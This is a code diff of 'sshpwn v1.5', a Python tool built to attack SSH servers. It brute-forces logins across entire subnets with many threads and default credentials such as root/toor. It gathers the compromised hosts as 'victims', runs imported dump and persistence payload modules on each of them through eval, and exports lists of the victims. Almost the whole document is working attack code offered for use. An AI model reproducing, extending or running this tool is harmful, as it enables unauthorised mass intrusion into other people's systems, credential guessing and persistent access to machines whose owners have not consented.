@@ -1,17 +1,36 @@
 #!/usr/bin/python3
 
-from pwn import *
-import sys
+# sshpwn v1.5
+
+# Copyright (c) 2016 Shawn Pang
+# http://shawnpang.com
+# Released under the MIT license
+
+import sys, os, time, threading
 import misc.coloredstatus as cs
-from payloads.fun import *
-import threading
 from queue import Queue
-import time
+from pwn import *
+from payloads.fun import *
+from payloads.dump import *
+from payloads.persistence import *
+
+def consolidatevictims(victims):
+    
+    if len(victims) == 0:
+        print(cs.error, "Unable to connect to any user!")
+        return 1
+
+    print()
+    for victim in victims:
+        print(cs.good, "Connected to", victim.user + " at " + victim.host)
+    print(cs.status, "Total connected users:", len(victims))
+    return 0
 
 def getvictimlist(configs):
+
     mode = input("\n" + cs.status + " Enter 's' for single-user mode, 'm' for multi-user mode, 'b' for brute force mode: ")
-    
     victims = []
+    
     if mode == 's':
         RUSER = input(cs.status + " Enter remote user: ")
         RHOST = input(cs.status + " Enter remote host: ")
@@ -22,36 +41,69 @@ def getvictimlist(configs):
             return None
 
     elif mode == 'm':
+        def threader():
+            while True:
+                ip = q.get()
+                multiuser(ip[0], ip[1])
+                q.task_done()
+        
+        def multiuser(login, ip):
+            try:
+                s = ssh(user=login, host=ip, keyfile=configs["KeyFile"], password=password, timeout=2)
+                victims.append(s)
+            except:
+                pass
+        
         print(cs.status, "Using", configs["HostFileForMultiUser"], "file")
         victimlist = list(entry.strip().split(" ") for entry in open(configs["HostFileForMultiUser"], "r") if entry.strip())
 
-        for victimentry in victimlist:
-            try:
-                victims.append(ssh(user=victimentry[0], host=victimentry[1], password="redhat", keyfile=configs["KeyFile"]))
-            except:
-                continue
-        if len(victims) == 0:
-            print(cs.error, "Unable to connect to anyone in", configs["HostFileForMultiUser"], "file")
-            return None
+        # Configurations
+        password = input(cs.status + " Enter password to use (none): ")
+        password = "toor" if not password else password
+        
+        threads = input(cs.status + " Enter number of threads to use (256): ")
+        threads = 256 if not threads else int(threads)
+        
+        # Variables
+        q = Queue()
 
-        for victim in victims:
-            print(cs.good, "Connected to", victim.host)
-        print(cs.status, "Total connected users:", len(victims))
-        return victims
+        # Threading
+        start = time.time()
+
+        print(cs.status, "Prepping targets...")
+        for workers in range(threads):
+            t = threading.Thread(target=threader)
+            t.daemon = True
+            t.start()
+
+        print(cs.status, "Multi-user mode starting...")
+        for victimentry in victimlist:
+            q.put(victimentry)
+
+        q.join()
+        print(cs.status, "Multi-user mode time taken: ", '{:.2f}'.format(time.time() - start), "seconds")
+        # Threading End
+
+        # Consolidate Victims 
+        consolidateresult = consolidatevictims(victims)
+        if consolidateresult == 1:
+            return None
+        else:
+            return victims
 
     elif mode == 'b':
+        def threader():
+            while True:
+                ip = q.get()
+                bruteforce(ip)
+                q.task_done()
+        
         def bruteforce(ip):
             try:
                 s = ssh(user=login, host=ip, password=password, timeout=2)
                 victims.append(s)
             except:
                 pass
-
-        def threader():
-            while True:
-                ip = q.get()
-                bruteforce(ip)
-                q.task_done()
 
         # Configurations
         login = input(cs.status + " Enter username to use (root): ")
@@ -60,16 +112,28 @@ def getvictimlist(configs):
         password = input(cs.status + " Enter password to use (toor): ")
         password = "toor" if not password else password
 
-        network = input(cs.status + " Enter network: (192.168.1) (comma seperate multiple): ")
-        network = "192.168.1" if not network else network
-        network = list(networkportion.strip() + "." for networkportion in network.split(","))
+        subnets = input(cs.status + " Enter subnets: (192.168.1) (comma seperate multiple) (dash for range): ")
+        subnets = "192.168.1" if not subnets else subnets
+        # Check if a range was entered
+        subnets = list(subnet.strip() + "." for subnet in subnets.split(","))
+        subnetrange = len(subnets) == 1 and "-" in subnets[0]
+        if subnetrange:
+            octets = subnets[0].split(".")
+            firstoctet = octets[0]
+            secondoctet = octets[1]
+            lastoctet = octets[2]
+            lastoctetrange = lastoctet.split("-")
+            if len(lastoctetrange) != 2:
+                print(cs.error, "Invalid subnet range! Usage: 192.168.6-20")
+                return None
+            rangestart = int(lastoctetrange[0])
+            rangeend = int(lastoctetrange[1]) + 1
         
         threads = input(cs.status + " Enter number of threads to use (256): ")
         threads = 256 if not threads else int(threads)
 
         # Variables
         q = Queue()
-        victims = []
         # print_lock = threading.Lock()
 
         # Threading
@@ -82,51 +146,100 @@ def getvictimlist(configs):
             t.start()
 
         print(cs.status, "Brute force starting...")
-        if network[0].count('.') == 3:
-            for networkportion in network:
-                for digit in range(255):
-                    q.put(networkportion + str(digit))
+        
+        # Class B Entire Network
+        if subnets[0].count('.') == 2:
+            for subnet in subnets:
+                for i in range(255):
+                    for k in range(255):
+                        q.put(subnet + str(i) + '.' + str(k))
+        
+        # Class B Network Range
+        elif subnetrange:
+            for i in range(rangestart, rangeend):
+                for k in range(255):
+                    q.put(firstoctet + '.' + secondoctet + '.' + str(i) + '.' + str(k))
+        
+        # Class C Entire Network
+        elif subnets[0].count('.') == 3:
+            for subnet in subnets:
+                for i in range(255):
+                    q.put(subnet + str(i))
+        
+        # Class A currently not supported, too big
         else:
-            for networkportion in network:
-                    for i in range(12, 14):
-                        for k in range(255):
-                            q.put(networkportion + str(i) + '.' + str(k))
+            print(cs.error, "Invalid ip subnet format!")
+            return None
 
         q.join()
-        print(cs.status, "Brute force time taken: ", '{:.2f}'.format(time.time() - start), "seconds\n")
+        print(cs.status, "Brute force time taken: ", '{:.2f}'.format(time.time() - start), "seconds")
         # Threading End
 
-        # Consolidate Victims
-        if len(victims) == 0:
-            print(cs.error, "Unable to connect to anyone in", configs["HostFileForMultiUser"], "file")
+        # Consolidate Victims 
+        consolidateresult = consolidatevictims(victims)
+        if consolidateresult == 1:
             return None
-        
-        for victim in victims:
-            print(cs.good, "Connected to", victim.host)
-        print(cs.status, "Total connected users:", len(victims))
-        return victims
+        else:
+            return victims
 
     else:
         print(cs.error, "Unknown mode '" + mode + "'")
         return None
 
-def builtincmd(cmd):
-    if not cmd:
+def builtincmd(cmd, victims):
+    if not cmd[0]:
         return 2
-    elif cmd == "back":
+    elif cmd[0] == "help":
+        print("Built-in commands:\nhelp, back, exit, victims, export\n")
+        os.system("ls -lR payloads/ --hide=*.pyc --hide=__pycache__ --hide=__init__.py")
+        return 2
+    elif cmd[0] == "back":
         return 1
-    elif cmd == "exit" or cmd == "quit":
-        print(cs.status, "Exiting...")
+    elif cmd[0] == "exit" or cmd[0] == "quit":
+        print("\n" + cs.status, "Exiting...")
         sys.exit(0)
-    elif cmd == "help":
-        print("back, exit, quit")
+    elif cmd[0] == "victims":
+        consolidatevictims(victims)
         return 2
-    else:
-        return
+    elif cmd[0] == "export":
+        def exportusage():
+            print(cs.status, "Usage: export [format: sshpwn, iplist, both] [output w/o extension]")
+        if len(cmd) != 2:
+            exportusage()
+            return 2
+        params = cmd[1].split(" ")
+        if len(params) != 2:
+            exportusage()
+            return 2
+        elif params[0] != "sshpwn" and params[0] != "iplist" and params[0] != "both":
+            print(cs.error, "Unknown format '" + params[0] + "'")
+            return 2
 
-def execute(cmd, victim, configs, params=None):
+        print("\n" + cs.status, "Exporting connected users list with '" + params[0] + "' mode...")
+        if params[0] == "sshpwn":
+            output = open(params[1] + ".sshpwn", 'a')
+            for victim in victims:
+                output.write(victim.user + " " + victim.host + "\n")
+            output.close()
+        elif params[0] == "iplist":
+            output = open(params[1] + ".txt", 'a')
+            for victim in victims:
+                output.write(victim.host + "\n")
+            output.close()
+        elif params[0] == "both":
+            output = open(params[1] + ".sshpwn", 'a')
+            output2 = open(params[1] + ".txt", 'a')
+            for victim in victims:
+                output.write(victim.user + " " + victim.host + "\n")
+                output2.write(victim.host + "\n")
+            output.close()
+            output2.close()
+        print(cs.good, "Exported list to", params[1])
+        return 2
+
+def execute(cmd, victim, configs):
     try:
-        result = eval(cmd + ".execute(victim, configs, params)")
+        result = eval(cmd[0] + ".execute(victim, configs, " + ("cmd[1]" if len(cmd) > 1 else "params=None") + ")")
     except NameError:
         print(cs.error, "Payload not found!")
         return 1
@@ -156,24 +269,21 @@ def main():
                 sshpwncmd = input("\n" + cs.command + " sshpwn > ")
                 sshpwntokens = sshpwncmd.split(" ", 1)
 
-                builtincmdcode = builtincmd(sshpwntokens[0])
+                builtincmdcode = builtincmd(sshpwntokens, victims)
                 if builtincmdcode == 1:
                     break
                 elif builtincmdcode == 2:
                     continue
             
                 for victim in victims:
-                    if len(sshpwntokens) == 1:
-                        exitcode = execute(sshpwntokens[0], victim, configs)
-                    else:
-                        exitcode = execute(sshpwntokens[0], victim, configs, sshpwntokens[1])
+                    exitcode = execute(sshpwntokens, victim, configs)
                     if exitcode == 1:
                         break
                     elif exitcode == 2:
                         continue    
 
     except KeyboardInterrupt:
-        print(cs.status, "Exiting...")
+        print("\n" + cs.status, "Exiting...")
 
 if __name__ == "__main__":
     main()
